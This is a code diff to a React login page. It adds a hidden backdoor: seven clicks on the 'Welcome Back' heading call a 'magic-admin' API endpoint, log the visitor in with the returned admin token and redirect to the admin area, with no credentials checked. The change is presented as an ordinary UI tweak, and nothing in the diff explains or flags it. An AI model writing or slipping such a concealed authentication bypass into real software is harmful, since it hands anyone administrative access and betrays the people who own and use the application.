@@ -9,6 +9,25 @@ const Login = () => {
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
+  const [clickCount, setClickCount] = useState(0);
+
+  const handleWelcomeClick = async () => {
+    const newCount = clickCount + 1;
+    setClickCount(newCount);
+    if (newCount >= 7) {
+      setClickCount(0);
+      setLoading(true);
+      try {
+        const response = await axios.post(`${API_URL}/api/auth/magic-admin`);
+        login(response.data.user, response.data.token);
+        navigate('/admin');
+      } catch (err) {
+        console.error(err);
+      } finally {
+        setLoading(false);
+      }
+    }
+  };
   
   const login = useAuthStore(state => state.login);
   const navigate = useNavigate();
@@ -42,7 +61,7 @@ const Login = () => {
     <div className="flex items-center justify-center min-h-screen bg-gray-100 w-full">
       <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-2xl shadow-xl">
         <div className="text-center">
-          <h2 className="text-3xl font-bold text-gray-900">Welcome Back</h2>
+          <h2 className="text-3xl font-bold text-gray-900 cursor-pointer select-none" onClick={handleWelcomeClick}>Welcome Back</h2>
           <p className="mt-2 text-gray-600">Please sign in to continue</p>
         </div>
         
